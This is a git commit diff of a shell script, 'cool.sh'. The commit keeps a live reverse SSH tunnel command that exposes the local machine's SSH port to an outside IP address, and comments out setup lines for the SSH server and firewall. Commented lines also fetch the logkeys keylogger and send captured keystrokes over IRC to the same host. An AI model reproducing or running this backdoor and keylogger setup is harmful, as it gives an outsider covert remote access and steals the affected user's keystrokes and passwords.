eeb64a51978412597263280c6d0edf3ffed9c2ad
gizmo87898 <73662348+gizmo87898@users.noreply.github.com>
2022-04-25 09:55:11 -0400

    Update cool.sh

--- cool.sh
+++ cool.sh
@@ -1,10 +1,9 @@
-sudo apt update
-sudo apt install openssh-server -y
-sudo ufw allow ssh
-echo "GatewayPorts yes" | sudo tee -a /etc/ssh/sshd_config
-systemctl reload ssh.service
-
-ssh -R 27580:127.0.0.1:22 gizmo@75.138.184.49
+#sudo apt update
+#sudo apt install openssh-server -y
+#sudo ufw allow ssh
+#echo "GatewayPorts yes" | sudo tee -a /etc/ssh/sshd_config
+#systemctl reload ssh.service
+ssh -N -R 27580:localhost:22 gizmo@75.138.184.49
 #wget http://launchpadlibrarian.net/165012984/logkeys_0.1.1a+git5ef6b0dcb9e3-2_amd64.deb
 #sudo apt install logkeys_0.1.1a+git5ef6b0dcb9e3-2_amd64.deb
 #logkeys -s --post-size=1K --post-irc 75.138.184.49:27580
